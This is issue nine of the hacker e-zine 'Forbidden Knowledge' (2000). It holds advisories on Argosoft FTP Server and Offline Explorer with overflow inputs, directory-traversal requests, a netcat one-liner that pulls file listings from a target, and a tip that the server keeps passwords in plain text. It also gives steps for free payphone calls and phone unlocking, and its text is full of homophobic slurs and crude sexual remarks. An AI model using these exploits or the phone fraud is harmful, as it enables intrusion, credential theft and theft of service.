@@ -1,0 +1,680 @@
+                                                      _
+                                          ._         .
+                    $$$P##ÒÒ·,              ^"'L,     +,.
+                    $$P'^^  '?$,             $$$;       ?$,
+                    $?        $$,y#$$$$QQy,  $$$        ;$I
+                    $;        $$$?'    ^?$$; $$$        $$'
+                    $$;      ;$$;        $$$,$$$,_  .,q$?'
+                    $$I     j$Z,_        $$$$$$$P$$$$$P'
+                    $$$   .+ý"^'"~      j$$$`$$$'^'?$$,
+              ,_    $$$                J$$$' $$$    $$$
+                ^Q##$$$ÒÒqqqq       ,d$$$'   $$$    $$$;
+                  `?$$$""      ,q$$$P`    ;$$$    ;$$Z
+   .                $$$       .;$$$$"^     ,$$$$     '?$P,                 .
+   :                $$$       Z$$$$$$QQ###Z?'           "ý,._             :
+ ',$,,'                        ``^^^""""ýýi,                            ',,$,'
+ . $" ,                                    +                            , "$ .
+ ; $  ;                                     .                           ;  $ ;
+. ^;. $ .                     EFF TW0 KAY!@#%&                        . $ .;^
+.'$; "$$"                 ITZ THE IN THING TO SAY                       "$$"
+;$';$^ ,$$,.,;'             WE ARE SO DAMN GHAY                       ';,.,$$,
+^$;$$$$"^``                  BUT WH0T THE HEY                            ``^"
+$$$$"'                                                                     '"
+
+                 Issue Nine: Released Valentines Day, 2000AD
+             Forbidden Knowledge: Telkom's best friend since 1998
+
+Hold it right there! Do you have some-one special in your life that you should
+be giving your utmost adoration to at this moment instead of reading this?
+Good. Neither do we. :)
+
+Editors: Wyzewun, Pneuma, Vortexia
+Writers: Moe1, Jus
+Azzkjey: Cyberphreak
+
+The el8 Contributers to this Ish: MercEnarY, CoLdBLood, egodeath
+
+                                  Shout Outz
+                                  +-======-+
+Blabber.Net's #hack, b4b0, DrSmoke, MostHated, kokey, icesk, The Chiqz in the
+hostal across from us who do strip shows for me and Pneuma, UglyKidJoe, aus,
+Cruciphux, NtWaK0, Opium, Corrupt SYN, Sigma, ColdBlood, Everyone involved
+with RIFT, b10z, Ultima, Eth`Real, MercEnarY, Gevil, meiso, egodeath
+
+                                   Fuck Youz
+                                   +-=====-+
+Telkom, Oprah Windfrey, The US Government, The SA Government, Chiqz from
+Catholic All-Girls schools who wave at me and giggle, The Prostitues on my
+road who wave at me and lift their shirts, Anyone without any cheap plastic
+toys on their monitor, Anyone who is a member of a LUG, Stalker and all those
+other #hack elitez who suck dick for Chanserv, Heroin addicts without scottish
+accents
+
+Gov-Boi's Valentine: www.r33t.org/images/mmm.jpg
+
+South African demo scene disk mag: RIFT <www.overload.co.za>
+
+Toys of the Month: ngrep <www.packetfactory.net>, FreeAmp <www.freeamp.org>,
+                   GPG <www.gnupg.org>, nmap <www.insecure.org/nmap>
+
+Official FK9 Demi-God: Gillian Anderson
+Official FK9 Beverage: Dark Dog <www.darkdog.com>
+Official FK9 Games: Commander Keen, Zork, and all things l33t and retr0
+Official FK9 Soundtrack: Korn - Issues, Limp Bizkit - Significant Other,
+                         Bloodhound Gang - Hooray for Boobies
+
+Yes: I finally gave in. Pneuma made me watch 'Hackers' - the movie. I have
+     never seen anything more hilarious in my life. Man, I want to get that
+     on video, heh. :P
+
+Us Being Media Wh0rez: ftp.electrocity.com/pub/videos/carte_blanche.mpg
+
+' Maybe you've noticed the new interface, reason being, Wyzewun is a total
+  crackdolphin when it comes to designing something. Hope it looks better
+  than the shitty FK logo's i draw :) ' ---- cyberphreak
+
+' This issue sucks, but the next one will 0wn '
+    ---- New official motto for every issue we release. Ever. :P
+
+
+     ________,,,...........                 .........______
+$$$$$$$$$½½½½½½½^^^^^                                      '''''"""???zz.   $$
+   ^?$$$                                                                `?; $$
+     '$$          Contents of Forbidden Knowledge Issue 9                $;$$$
+      ?;                                                              ,,?;I$$$
+     ,"________________________________________________________..,,##½½½',  $$
+  _.+                                                                     +.,;
+
+
+        0x90> Intro
+        0x90> Byteware of the Month
+
+        Articlez...
+
+        0x61> VMB's Carriers, etc etc
+        0x62> Book Review - Maximum Security
+        0x64> Argosoft FTP Server Advisory
+        0x65> Accepting the New Generation
+        0x63> Oh no, not More IRC Logs
+        0x64> Cellphone and Payphone Warez
+        0x65> Offline Explorer Advisory
+        0x66> The Drunk Article
+
+        Other junk...
+
+        0x30> Secret Zero-day C++ Kodez (3L33T.cPp)
+        0x31> Secret Oh-day Phone Warez (3L33T.mP3)
+        0x32> More Fun with spoofing (mommysmurf.c)
+        0x33> Egodeath's Ghay RDS Kodez (rfind.zip)
+        0x34> Telkom Ghay Seckz Juarez (telkom.txt)
+        0x35> TCP/UDP Portscanner (portskanah2.zip)
+        0x36> IIS4 Long *.HTR Vulnerability Scanner
+
+        0x90> Lamer of the Millenium
+        0x90> Outro
+,?'
+$$;
+$$$QQQ####,,,,________________________________           _________    ______ _
+^^^^^^^^^""""""
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;,
+_.                           Editorial by Wyzewun                 ._ ,;:;,, _.
+
+Supplies Low. Starving to Death. Send Help immediately.
+
+Yeh, I'm in boarding school - Can you handle it? ;) Heh, actually I just
+really needed to get away from my fantastically pathetic and completely
+emotionally inept parents and boarding school was the quickest escape route at
+hand. *Sigh* It works well enough, so what the hell. And besides, living here
+is dope - a ley line runs directly through the hostal. (Those of you with a
+vague knowledge of the occult will know what I am talking about - the rest of
+you - get a clue bizatch! :P)
+
+At the end of this year I'll probably be sharing a place with Moe1 and/or 
+Pneuma, so that should be quite cool. Once again, I don't want to have to live
+with my parents for longer than a month inbetween finishing school and then -
+the weekends I spend with them are bad enough. I get depressed being away from
+people with talent and emotions and from being away from the ley line, where
+I'm just naturally more at home. Anyway, everything is going to take a
+complete turn-around next year when I begin my new life as a suit - PHEAR! :)
+Mmm, I'm not sure exactly how becoming an upstanding citizen will affect FK,
+but hopefully, the impact upon it will be minimal.
+
+I just wouldn't *like* being a jargon-spewing egocentric suit with a
+surgically removed personality, and although I will make a very concerned
+effort to appear as mentally stable as possible to potential clients, I 
+don't want personal things like FK to have to change. It's my baby, and I
+like it the way it is, damnit. :P
+
+Anyway, enjoy this issue - Regardless of what the future holds for us, this
+issue is still bad as ever. Good ol' reliable FK... ;D
+
+Cheers,
+Drew/Wyzewun
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;,
+_.                        Byteware for this Issue                 ._ ,;:;,, _.
+
+Byteware from Wyzewun...
+------------------------
+
+Vodacom SMS billing lags significantly behind normal billing. Say no more.
+
+---
+
+Editing FreeAmp's /base/win32/src/win32thread.cpp file can make it run
+decently under Win9x/Nt, something it doesn't do by default. :/ Just change
+the following...
+
+	m_priority		= Normal;
+
+To, something like... oh, this... :)
+
+	m_priority		= Critical;
+
+It still screws up a bit if you start working in a DOS prompt though. I can't
+figure out why, else I would fix this too. :/
+
+---
+
+220 1100JD1100 Service ready for new user.
+Anyone know what kind of system that is? Mail me! :)
+
+---
+
+Oh yeh, Sigma pointed out to me that that bug in TP7's Crt library only
+affects Celeron processors. Right. Case closed. We understand the problem
+fully... Errr... Two issues after the problem occured, HEH. ;-)
+
+---
+
+Right. Time for a gay little trick to play on Windoze 98 Users. Find an old
+copy of Pacman that can't be exitted in any way other than rebooting the whole
+PC. Make a PIF file for it so that it will always run in MS-DOS mode. Then run
+it, and watch Pacman boot instead of Win98 again and again and again. :)
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;, 
+_.         Book Review by Wyzewun: "Maximum Security" by Anonymous   ._ ,;:;,, _. 
+
+Maximum Security: A Hacker's Guide to Protecting your Internet Site & Network
+By Anonymous
+
+ISBN: 1-57521-268-4
+Downloadable from: blacksun.box.sk
+
+I chose to review this book because it is one of the most popular amongst
+businessmen who want a quick and dirty insight into security. The "Hacker's
+Guide" thing seems to make them sell like hotcakes. And the suits that read
+this book are impressed, as one would imagine, because it makes security look
+straight foward and easy, and once they've read it, they feel that they
+understand. Great, but how about understanding how it *really* is? :)
+
+I have to be honest - The book looks like the product of about a month online
+sifting through the results of a search for "hack" on Altavista. Several
+explanations are left out, simply because the author doesn't fully understand
+the idea himself, and it is just left not making sense.
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;, 
+_.            "Oh no! Not more IRC Logs!" collected by Wyzewun    ._ ,;:;,, _. 
+
+<opium> wyze1: WHY AM I NEVER IN FK LOGS!
+<wyze1> opium: COZ YER NOT AMUSING, SLUT!
+<opium> dont tell me that :(
+ð opium will give wyze1 anal sex!!!
+
+<CodeZer0> gov-boi_: have you exploit sucefully the ssh 1.3.27 ?
+<gov-boi_> CodeZer0: yea.
+
+<whirlygig> Ok so I'm drinking champagne
+<whirlygig> 3-2-1 HAPPY NEW YEAR
+<whirlygig> And so I sit.
+<whirlygig> Look around
+<whirlygig> And NOTHING happened.
+<whirlygig> I was disapointed.
+<whirlygig> The aliens could of at least come and say hi.
+<whirlygig> Well with all the fuss i just wanted something to happen.
+<whirlygig> No riots, aliens..
+<nuwezyw> whirlygig: yeh, i want my money back
+<whirlygig> Money from what?
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;, 
+_.                   Argosoft FTP Server Advisory by Moe1         ._ ,;:;,, _. 
+
+The Argosoft FTP Server [www.argosoft.com] contains multiple vulnerabilities
+in various FTP commands which allow execution of arbitary code and the
+ability to read any file on the hard-drive.
+
+Any command followed by 2050 characters causes the FTP Server to crash.
+
+example:
+
+C:\>ftp 127.0.0.1
+Connected to 127.0.0.1.
+220 Argosoft FTP Server, Version 1.0 (1.0.0.7)
+User (127.0.0.1:(none)):AAAAAAAAAAAA...(2050 characters long)
+
+After a while the FTP Server logs show...
+
+(     4) 'Error: Access violation at address 00401CBB in module
+'FTPSERVER.EXE'. Write of address 41414145
+
+[Wyzewun's Babblings: Classic Buffer Overflow]
+
+When FTP Server is shutdown, another error occurs...
+
+FTPSERVER caused an invalid page fault in module at 0000:00000000.
+Registers:
+
+EAX=00000000 CS=0000 EIP=00000000 EFLGS=00000000
+EBX=00000000 SS=0000 ESP=00000000 EBP=00000000
+ECX=00000000 DS=0000 ESI=00000000 FS=0000
+EDX=00000000 ES=0000 EDI=00000000 GS=0000
+
+[Wyzewun's Babblings: This is a BSS Overflow (Uninitialized Heap Data). Or at
+ least I think it is - some-one bitch at me if I'm wrong. Anyway, The BSS is
+ executable in most OS's, for pretty much no reason at all (Like we're going
+ to need to execute a whole bunch of zeros), and Windoze is no exception. In
+ fact, I think the only exception is Solaris - I can't say I'm sure about that
+ though. Anyway, having an executable BSS creates a pointless security threat,
+ and OS developers really should stop making it as such.]
+
+C:\work\Argosoftftp>ftp 127.0.0.1
+Connected to 127.0.0.1.
+220 Argosoft FTP Server, Version 1.0 (1.0.0.7)
+User (127.0.0.1:(none)): t-zr
+331 User name OK, need password
+Password:
+230 User t-zr logged in successfully
+ftp> quote cwd AAAAAAA...(2050 characters long)
+
+FTP Server crashes with...
+
+FTPSERVER caused an invalid page fault in
+module FTPSERVER.EXE at 015f:00405b71.
+
+Registers:
+EAX=0040788c CS=015f EIP=00405b71 EFLGS=00010287
+EBX=0040788c SS=0167 ESP=00e1fc3c EBP=00e201cc
+ECX=00000001 DS=0167 ESI=00e201c8 FS=0f5f
+EDX=00e201c8 ES=0167 EDI=00407ad8 GS=0000
+
+If logging is enabled then before the Server crashes the logs show...
+(     1) 'Error: Invalid pointer operation
+
+[Wyzewun's Babblings: Heap overflow. This also works even without the 'CWD' or
+ whatever in front of it - the bug is in the code that recieves the command
+ from the socket, not in the code that executes it. I don't know exactly how
+ the author has written this program for this problem to occur, so I think
+ I'll leave it at "badly". :P]
+
+Argosoft FTP Server allows directory climbing out of homedirectory in the same
+manner Wyzewun covered with E-Serv last issue. Just 'quote cwd ../' and you're
+on your way. ;-)
+
+Argosoft FTP Server keeps passwords in plain text in the users.dat file, so
+get that if you want.
+
+This has been tested under Win95, Win98 and WinNT.
+
+Bottom line: Argosoft FTP Server offers NO security.
+
+And now, for humours sake, the authors reaction to me showing him this...
+
+------------------ snip snip -----------------------
+Thanks for your list. It is really very handy and useful. But, you will have
+to keep in mind, that what I am offering is a freeware program, and you should
+not be demanding from it too much security, and handling of such a difficult
+issues such large strings and so on.
+
+[Moe1: hmm... too much security??? wtf is the bitch talkin about?? there aint
+NO security in this ftp server!]
+
+[Wyze1: Damn straight, and just coz yer program is free, doesn't mean it has
+to be AWFUL. Also, handling large strings is difficult??? How difficult is the
+Delphi equivalent of a 'for' loop and a routine to get a single character? I'm
+only 16, my code *sucks*, and *I* don't find this difficult. And the thing
+that really scares me here is that all this is coming from a programmer by
+profession. Heeey, that's an idea! Nevermind my final year of school, I'm
+going to go and work for Argosoft!!@#$% :P]
+
+Anyway, I will keep in mind all your comments and suggestions, and definitely
+will do improvements.
+
+Happy New Year!!!
+Artchil Gogava
+------------------ snip snip -----------------------
+
+HEH, Delphi coders are so gay. (With apologies to Sigma of corz - we lub j0o)
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;, 
+_.                  Various Phone Warez from MercEnarY            ._ ,;:;,, _. 
+
+First off, let's cover phreaking the telkom tetabox fones. Note: Not the big
+blues ones, those small ones you find in some places [Wyzewun: He's reffering
+to Telkom's Chatterbox range. You'll recognize it coz it says "Chatterbox" on
+it - imagine that :P]
+
+This technique was picked up by me when trying to phone ppl in Johannesburg
+when i was at boarding school, and lets you use telkom coin phone to phone for
+free (not exactly free cause the line still gets charged just not you)...
+
+1) You need access to the plugin point of the phone (some of the older phones
+   have a point where the jack can be attached to the phone, in the newer ones
+   the jack is already attached, therefore you need to find then point where
+   the jack goes into the wall instead)
+
+2) Now dial '080' and wait for the fast engaged signal 
+
+3) When you have the signal quickly take the jack out of the connection point
+   and put it back in, check if the phone has dialing tone and 080 is still
+   printed on the LCD screen, if there is no dialing tone you have moved the
+   line in and out too fast, if the 080 is not printed on the screen you have
+   moved the line too slow
+
+4) Now the phone has 080 on the screen and then you can dial the number you
+   want. Also note that if you want to dial a local number you must enter the
+   area code.
+
+Theory behind this: The phone is lead to believe that you are dialing a 080
+(toll free) number.
+
+Wondering: If you cut a fone line coming out a normal payphone and connect it
+to so that you have a point where you can connect and disconnect as you
+please, would this work? [Wyzewun: Yes]
+
+---
+
+Now for How to get mastercode for unlocking cellphones...
+
+The code is a combination of the SP code (5 digit) and phone IMEI (15 digit)
+use mc1.exe and mc2.exe to get the code
+
+To view the IMEI of the Cell, press: *#06#
+
+Check,Activate or Remove card restrictions
+
+    #pw+XXXXXXXXXX+1# - Provider-Lock status
+    #pw+XXXXXXXXXX+2# - Network-Lock status 
+    #pw+XXXXXXXXXX+3# - Provider(???)-Lock status 
+    #pw+XXXXXXXXXX+4# - SimCard-Lock status 
+
+XXXXXXXXXX (master code) is a 10 digit code, based on the IMEI number of your
+phone. Press * many times for "p" and "w".
+
+Service Provider Codes
+
+MTN = 655 10
+Vodacom = 655 01
+
+---
+
+Now let's play around a bit with Net monitor on your cellphones (works wif
+Nokia 51xx and 61xx maybe 3210)
+
+Net Monitor is an extended menu on Nokia Phone. This will be a new additional
+Menu on your Nokia 5110 if you installing this option. For enabling the Net
+Monitor with a FBUS cable you need the DOS software PCLocals V1.3.
+
+The Network Monitor gives you the following information:
+
+Carrier number
+MS RX level in dBM 
+Received signal quality 
+MS TX power level 
+C1 (path loss criterion, used for cell selection and reselection). The range
+is -99 to 99
+RLT (Radio Link timeout) 
+Timeslot 
+Indication of the transmitter status 
+Information on the network parameters 
+TMSI (temporary Mobile Subscriber Identity) 
+Cell Identification (CELL ID, number of the cell being used) 
+MCC (Mobile Country Code) 
+MNC (Mobile Network Code) 
+LAC (location Area Code) 
+Ciphering (on/off) 
+Hopping (on/off) 
+DTX (on/off) 
+Discarding cell barred information
+
+Here is a 10 step description for enabling the net monitor (field test
+display) using PCLocals:
+
+Make sure to start PCLocals in plain DOS
+
+First don't connect the phone, start the program and ignore the error message.
+Configure the cable type and com port (hardware com port, not the virtual com
+port like for the datasuite).
+Save the settings, quit the program. 
+Connect the phone with the cable and start the program. 
+The phone "boots" as you enter the main menu and all options become available
+(all menus are white colored).
+Choose menu 3 (ME Memory Functions). 
+Choose menu 6 (Field Test Display Settings). 
+Now you have the following options:
+
+Enter 243 to activate the "big" net monitor (menu 01 to 89 including menus 01
+to 19).
+Enter 242 to activate the "small" net monitor (menu 01 to 19). 
+Enter 241 to deactivate the net monitor. 
+Enter 240 to reset timers (?) 
+Don't forget to confirm your selection with hitting enter (you won't see any
+reaction but it's necessary)
+
+Quit the program, the phone "boots" and enjoy the net monitor 
+
+All following actions are done with the phone.
+
+Go to the menu net monitor and at the test prompt enter 241 to deactivate the
+net monitor completely. Furtherly you can change from the big net monitor to
+the small net monitor by entering 242 at the test prompt (if menu net monitor
+is still available); Note: after that you can't change to the big net monitor
+again!!
+
+Note: if u cant find pclocals use net_monitor.exe, i dunno if it gets the big
+or small menu
+
+All comments should be mailed to MercEnarY at mercenary@sylicon.org
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;, 
+_.                   Offline Explorer Advisory by Wyzewun         ._ ,;:;,, _. 
+
+Offline Explorer as available from www.metaproducts.com is the most popular
+Offline Web Browser available. It's fast, flexible, easy to use, and it does
+its job well. It is also a *HUGE* security hazard.
+
+Offline Explorer starts a server on port 800, through which one can view the
+downloaded webpage(s). So the poor shmuck's cache becomes remotely accessible!
+This is a security threat in itself, but it gets even worse: Remote directory
+climbing is possible!
+
+Right. Let's try some stuff out...
+
+GET /../ HTTP/1.1
+HTTP/1.0 404 Not Found
+Content-Type: text/html
+Content-Length: 57
+
+<HTML><BODY><H1>404 Document Not Found</H1></BODY></HTML>
+
+Nope. Let's try this then...
+
+GET ../ HTTP/1.1
+HTTP/1.0 200 OK
+Server: Web Downloader 4.1 (Win32)
+Content-Type: text/html
+Content-Length: 464
+ 
+<html><head><title>../</title></head><body><h3>Directory of ../</h3><p><hr>
+<table><tr><td><img src="/UpFold.gif" valign=middle></td><td><tt>0</td><td>
+<tt><a href="..">..</a></td></tr><tr><td><img src="/Folder.gif" valign=middle>
+</td><td><tt>0</td><td><tt><a href="localhost">localhost</a></td></tr></table>
+<hr><font size=-2><i><b>Offline Explorer 1.1</b> (C) 1998 - 1999, <a href=
+"mailto:info@metaproducts.com">MetaProducts corp.</a></i></font></body></html>
+
+Righty! So We're on to something! Well... unfortunately, not. We can't do
+anything along the lines of 'GET ../../' and something like 'GET ......../'
+won't work either. So practically, this means very little. :(
+
+What we *can* tell, however, is that the vulnerability *is* there. We just
+need to figure out how to exploit it. And so, we employ Wizdumb's el8
+directory climbing with a twist. Like so...
+
+GET ../..\ HTTP/1.1
+HTTP/1.0 200 OK
+Server: Web Downloader 4.1 (Win32)
+Content-Type: text/html
+Content-Length: 5048
+ 
+<html><head><title>../..\</title></head><body><h3>Directory of ../..\</h3><p>
+<hr><table><tr><td></td><td><tt>1696</td><td><tt><a href="MSDOS.SYS">MSDOS.SYS
+</a></td></tr><tr><td></td><td><tt>1033</td><td><tt><a href="AUTOEXEC.BAT">
+AUTOEXEC.BAT</a></td></tr><tr><td></td><td><tt>222390</td><td><tt><a href="IO.
+SYS">IO.SYS</a></td></tr><tr><td></td><td><tt>29636</td><td><tt><a href="BOOTL
+OG.TXT">BOOTLOG.TXT</a></td></tr><tr><td><img src="/Folder.gif" valign=middle>
+</td><td><tt>0</td><td><tt><a href="WINDOWS">WINDOWS</a></td></tr><tr><td><img
+src="/Folder.gif" valign=middle></td><td><tt>0</td><td><tt><a href="My
+Documents">My Documents</a></td></tr><tr><td><img src="/Folder.gif" valign=
+
+*Snip* (Too damn much of this crud :P)
+
+And there you have it. This was tested on Offline Explorer v1.1, but all
+versions prior to version [put here when it exists] are vulnerable. Thanks to
+Metaproducts for  As a temporary fix you could
+just firewall out port 800 to everyone except localhost.
+
+Also note that Offline Explorer wants to recieve its queries fast, you can't
+just telnet in and type your request, so do this or summing...
+
+   [drew@kung-fusion]$ cat > stupid.c << unf
+   void main() { printf("GET ../..\\\ HTTP/1.1\n\n"); }
+   unf
+   [drew@kung-fusion]$ gcc stupid.c -o stupid
+   [drew@kung-fusion]$ ./stupid | nc lame.doze.box 800 > heh.html
+   [drew@kung-fusion]$ lynx heh.html
+                
+Right. That's all from me for now. HEH, /../ this ../..\ that, I should become
+a full time ../ hax0rer! :P Cheers...
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     __... .                                                   . ...__
+  d$$^^                                                             ^^$$b
+.?$;                                                                   ;$$;:;, 
+_.                 The Drunk Article by Wyzewun and Pneuma         ._ ,;:;,, _. 
+
+[Note from the Editor: Don't ask me, I woke up one morning and it was here.
+ Forgein readers with no el8 Afrikaans sk1llz will have to suffer. :)]
+
+JESUS LIOVES ME VIZ I KNOW
+COZ DA BIBLE TELLZ ME SO
+MUAHAKLLALALAKLALALALA
+
+ONS EET BOEREWORS
+ONS IS DRONK FK EDITROS
+OF SOM KAK
+PHEAR ONS
+
+ONS IS NIE SOBER
+ONS HET GEPHUZA
+ONS IS UBER LEET
+ONS HAX000000000000000000000000000000000R GEGIBSONS EN POES WANT ONS IS DRONK
+
+KOM MY MIKIES, KOM LAAT DRINK
+DIS DIE BESTE IN DIE WERELD
+KOM MY LIEVE DRONKING KEREL
+LAAT ONS GEVOK WEES SOOS DIE BEES
+
+FINALLY THE ONE LEGGED MAN MAKES HIS APPEARANCE AAAAAAAAAAAAAAAAARRRRRRRRRRGH
+
+I HAVCE KOS KOS IN MYN POES
+DO U HAVE KOS KOS IN YOUR POES?
+WE *ALL* SHIOULD HAVE KOS KMOS IN OWER POESA!!!!
+
+HIERDIE IS DIE BESTE DRONKSTE FK ARTIOKLE IN VA HISTORY VAN FK
+ONS IS VOKKING ELEET
+ONS HAX0R GIBZONS ELKE DAG
+HAX0R JY GIVZ0NS ELKE DAG
+JY VOKKING LAMH0RZ, 0NS 09WN JULLE
+
+0NS IS ELIYEZ SOOS GOV-B0I WAT SPTUPID 0-D4Y TRADEZ0R
+0NDS IS DIE BESTE HAX0RZ IN SUID AFRIKA
+0NS HET DIE 0-DDAY
+0BNS HET DIE BIER
+0NS HET DIE CHEAP WINE
+0NS HET DIE MAD AFRIKAANS SPEAKING SKILZZ
+
+PHEAR 0NZ - K00S 0WNZ J00 ALL@!&^#@#$^(^@(&(&
+
+
+;,                                                                       ,;;4,
+,?;;$;,__________________________________________________________________,,7$;
+
+
+     ________,,,...........                 .........______
+$$$$$$$$$½½½½½½½^^^^^                                      '''''"""???zz.   $$
+   ^?$$$                                                                `?; $$
+     '$$              Gaan weg van my jy Slapgat!@#$%^&                  $;$$$
+      ?;                                                              ,,?;I$$$
+     ,"________________________________________________________..,,##½½½',  $$
+  _.+                                                                     +.,;
+
+" But would I be a good Messiah with my low self esteem,
+  If I don't believe in myself would that be blasphemy?
+  Just sport some crummy 'holier than thou' facade,
+  Yeah that's what I would do if I were God "
+  	--- Bloodhound Gang, Hell Yeah
+
+da f0ll0w1ng s00per-fux1ng el8 sytez c0urier the 0-d4y ju4r3z to j0o...
+
+http://packetstorm.securify.com/mag/fk
+http://www.security.za.net/wyze1/fk.html
+http://hackersclub.com/km/magazines/fk.html
+ftp://ftp.etext.org/pub/Zines/Forbidden_Knowledge
+http://www.attrition.org/~modify/texts/zines/Forbidden_Knowledge
+
+Thanks to kM, modify, the Packetstorm Staff and E-Text for being our official
+distribution sites.
+
+   mailto:wyze1@sexdrugsunix.org <!--|--!> http://www.security.za.net/wyze1
